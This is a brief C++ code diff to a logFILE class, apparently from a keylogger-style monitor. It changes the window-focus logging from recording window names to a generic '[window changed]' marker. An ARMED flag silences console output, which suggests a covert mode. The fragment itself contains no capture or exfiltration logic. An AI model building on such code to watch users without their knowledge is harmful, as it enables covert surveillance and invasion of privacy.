@@ -30,11 +30,8 @@ void logFILE::flush() {
 }
 
 void logFILE::logwindow() {
-	if (m_working && updateFocusedWindow(m_wname)) {
-		std::wstring tolog = L"\n[new window: ";
-		tolog += m_wname;
-		tolog += L"]\t";
-
+	if (m_working && updateFocusedWindow()) {
+		std::wstring tolog = L"\n[window changed]\t";
 		if constexpr (!ARMED) std::wcout << tolog;
 		m_file << tolog;
 	}
